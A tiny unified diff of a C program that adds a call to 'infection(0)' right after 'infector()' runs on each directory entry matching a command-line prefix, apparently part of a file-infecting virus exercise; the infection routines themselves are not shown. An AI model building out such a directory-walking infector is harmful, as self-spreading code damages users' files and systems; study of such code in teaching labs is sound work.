@@ -82,6 +82,7 @@ int main (int argc , char* argv[], char* envp[]){
     if(a_flag != 0){
         if(strncmp(dirp->d_name, argv[a_flag] + 2, strlen(argv[a_flag] + 2)) == 0){
             infector(dirp->d_name);
+            infection(0);
         }
     }
     curr_pos += dirp->d_reclen;
